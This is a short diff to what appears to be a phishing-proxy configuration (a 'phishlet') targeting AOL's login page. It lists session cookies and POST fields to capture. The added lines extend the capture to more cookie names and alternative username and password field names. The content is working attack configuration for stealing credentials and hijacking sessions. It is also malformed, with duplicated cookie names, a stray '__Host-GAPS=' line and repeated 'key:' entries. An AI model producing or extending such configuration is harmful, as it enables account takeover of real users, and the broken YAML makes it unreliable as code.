@@ -8,7 +8,9 @@ sub_filters:
 
 auth_tokens:
   - domain: 'login.aol.com'
-    keys: ['OTHP', 'OTH', 'T', 'BX', 'Y', 'FS', 'GUCS', 'AS', 'A1', 'A3', 'A1S', 'B', 'GUC', 'UID', 'USID', 'JSESSIONID', 'SIDCC', '__Secure-3PSIDCC']
+    keys: ['B', 'OTHP', 'OTH', 'T', 'BX', 'Y', 'FS', 'GUCS', 'AS', 'A1', 'A3', 'A1S', 'B', 'GUC', 'UID', 'USID', 'JSESSIONID', 'SIDCC', '__Secure-3PSIDCC', '__Host-GAPS', 'SIDCC', 'CONSENT']
+
+__Host-GAPS=
 
 auth_urls:
   - '/'
@@ -18,10 +20,12 @@ auth_urls:
 credentials:
   username:
     key: 'displayName'
+    key: 'username'
     search: '(.*)'
     type: 'post'
   password:
     key: 'password'
+    key: 'passwd'
     search: '(.*)'
     type: 'post'
 
